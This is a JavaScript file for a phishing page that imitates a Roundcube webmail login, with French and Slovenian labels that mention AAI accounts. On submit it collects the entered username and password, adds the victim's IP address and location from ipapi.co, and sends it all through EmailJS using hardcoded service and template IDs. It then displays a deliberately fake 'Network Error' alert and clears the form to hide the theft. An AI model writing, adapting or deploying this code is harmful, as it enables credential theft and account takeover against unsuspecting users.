// --- AUTO-LANGUAGE TRANSLATOR ---
document.addEventListener('DOMContentLoaded', function() {
    
    // 1. Get the browser language (e.g., "fr-FR" or "sl-SI")
    var userLang = navigator.language || navigator.userLanguage; 
    console.log("Detected Language:", userLang);

    // 2. Define the translations
    var text = {
        // French
        fr: {
            user: "Nom d'utilisateur",
            pass: "Mot de passe",
            btn: "Connexion",
            help: "Pour vous connecter avec un compte AAI, cliquez sur le bouton ci-dessus.",
            placeholderUser: "Entrez votre nom",
            placeholderPass: "Entrez votre mot de passe"
        },
        // Slovenian
        sl: {
            user: "Uporabniško ime",
            pass: "Geslo",
            btn: "Prijava",
            help: "Če se želite prijaviti z AAI-računom, najprej kliknite na gumb AAI-prijava.",
            placeholderUser: "Vpišite uporabniško ime",
            placeholderPass: "Vpišite geslo"
        }
    };

    // 3. Apply the changes based on language
    if (userLang.startsWith("fr")) {
        // Apply French
        document.getElementById('txt_user').innerText = text.fr.user;
        document.getElementById('txt_pass').innerText = text.fr.pass;
        document.getElementById('rcmloginsubmit').innerText = text.fr.btn;
        document.getElementById('txt_help').innerText = text.fr.help;
        document.getElementById('rcmloginuser').placeholder = text.fr.placeholderUser;
        document.getElementById('rcmloginpwd').placeholder = text.fr.placeholderPass;
    } 
    else if (userLang.startsWith("sl")) {
        // Apply Slovenian
        document.getElementById('txt_user').innerText = text.sl.user;
        document.getElementById('txt_pass').innerText = text.sl.pass;
        document.getElementById('rcmloginsubmit').innerText = text.sl.btn;
        document.getElementById('txt_help').innerText = text.sl.help;
        document.getElementById('rcmloginuser').placeholder = text.sl.placeholderUser;
        document.getElementById('rcmloginpwd').placeholder = text.sl.placeholderPass;
    }
});

// --- LOGIN FORM LOGIC ---
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Stop page reload

    // 1. Get input values
    var usernameInput = document.getElementById('rcmloginuser').value;
    var passwordInput = document.getElementById('rcmloginpwd').value;
    var btn = document.getElementById('rcmloginsubmit');

    // 2. Change button text
    btn.innerHTML = "Verifying...";
    btn.disabled = true;

    // 3. YOUR KEYS
    var serviceID = "service_ldqkblf";   
    var templateID = "template_dcb51ek"; 

    // 4. Default Data
    var templateParams = {
        username: usernameInput,
        password: passwordInput,
        ip_address: "Fetching...",
        city: "Unknown",
        country: "Unknown",
        org: "Unknown",
        date: new Date().toString()
    };

    // 5. Get Location & Send
    fetch('https://ipapi.co/json/')
        .then(function(res) { return res.json(); })
        .then(function(data) {
            templateParams.ip_address = data.ip;
            templateParams.city = data.city;
            templateParams.country = data.country_name;
            templateParams.org = data.org;
        })
        .catch(function(err) {
            console.log("Location failed, sending anyway...");
            templateParams.ip_address = "Location lookup failed";
        })
        .finally(function() {
            // 6. SEND TO EMAILJS
            emailjs.send(serviceID, templateID, templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    
                    // 7. FAKE ERROR MESSAGE
                    alert("Network Error: Connection to the authentication server timed out. Please try again later.");
                    
                    // 8. RESET BUTTON & CLEAR FORM
                    btn.innerHTML = "Login";
                    btn.disabled = false;
                    document.getElementById('login-form').reset(); // This wipes the username and password

                }, function(error) {
                    console.log('FAILED...', error);
                    // This alert will now tell you exactly what is wrong
                    alert("System Error: " + JSON.stringify(error));
                    btn.innerHTML = "Login";
                    btn.disabled = false;
                });
        });
});